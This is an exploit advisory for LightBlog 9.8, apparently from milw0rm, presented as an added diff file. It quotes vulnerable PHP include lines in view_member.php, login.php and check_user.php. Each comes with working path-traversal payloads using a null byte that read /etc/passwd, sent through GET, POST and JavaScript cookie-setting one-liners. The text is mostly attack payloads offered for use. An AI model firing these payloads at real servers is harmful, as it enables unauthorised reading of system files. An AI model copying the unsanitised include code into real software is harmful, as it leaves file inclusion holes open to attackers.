@@ -1,0 +1,53 @@
+# LightBlog 9.8 (GET,POST,COOKIE) Multiple Local File Inclusion Vulnerabilies
+# url: http://www.publicwarehouse.co.uk/php_scripts/lightblog.php
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+vuln file: view_member.php
+vuln code:
+8: if(isset($_GET['username']) and file_exists("./accounts/".$_GET['username'].".php")){
+x: ...
+24: include("./accounts/{$username_get}.php");
+39: }
+
+PoC: GET view_member.php?username=[file]%00
+ExP: GET view_member.php?username=../../../../../../../../../../etc/passwd%00
+
+---
+
+vuln file: login.php
+vuln code:
+18: include("./accounts/".$_POST['username_post'].".php");
+
+PoC: POST login.php?username_post=[file]%00
+ExP: POST login.php?username_post=../../../../../../../../../../etc/passwd%00
+
+---
+
+vuln file: check_user.php
+vuln code: 
+6: if(isset($_COOKIE['Lightblog_username']) and isset($_COOKIE['Lightblog_password'])){
+
+   $username_cookie = $_COOKIE['Lightblog_username'];
+   $password_cookie = $_COOKIE['Lightblog_password'];
+
+   if(file_exists("./accounts/{$username_cookie}.php")){
+13:include("./accounts/{$username_cookie}.php");
+
+PoC: javascript:document.cookie = "Lightblog_username=[file]%00; path=/"; document.cookie = "Lightblog_password=JosS;
+     path=/";
+ExP: javascript:document.cookie = "Lightblog_username=../../../../../../../../../../etc/passwd%00; path=/";
+     document.cookie = "Lightblog_password=JosS; path=/";
+
+---
+
+and more ...
+hack0wn :D
+
+# milw0rm.com [2008-10-21]
